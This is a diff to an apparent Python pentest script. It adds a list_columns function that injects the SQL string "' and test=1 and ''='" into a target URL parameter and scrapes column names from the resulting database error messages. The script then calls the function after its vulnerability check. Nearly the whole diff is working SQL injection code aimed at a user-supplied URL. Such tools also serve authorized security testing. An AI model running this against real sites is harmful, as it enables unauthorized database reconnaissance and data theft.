@@ -30,6 +30,26 @@ def check_if_host_vulnerable(url, params, param_to_test):
     else:
         raise Exception('No Query Exception in the HTTP response.')
 
+def list_columns(url, params, param_to_test):
+
+    columns = []
+    params[param_to_test][0] = "' and test=1 and ''='"
+
+    print params
+    req = send_HTTP_request(url, params)
+    # print req.content
+    if ('not found; SQL statement' in req.content):
+        # pattern for the columns
+        pattern = re.compile(r'(_\.[a-zA-Z0-9_-]+\s)')
+        for column_name in re.findall(pattern, req.content):
+            column_name = column_name[2:-1]
+            columns.append(column_name)
+
+            print "[!] Column found : " + column_name
+    else:
+        raise Exception('We cannot manage to retrieve columns.')
+    
+
 # option parser
 parser = optparse.OptionParser()
 parser.add_option('--url', help='URL to pentest', dest='url')
@@ -56,3 +76,6 @@ else:
     # print params
     url = opts.url.split('?')[0]
     check_if_host_vulnerable(url, params, opts.param)
+
+   # list columns
+    list_columns(url, params, opts.param)
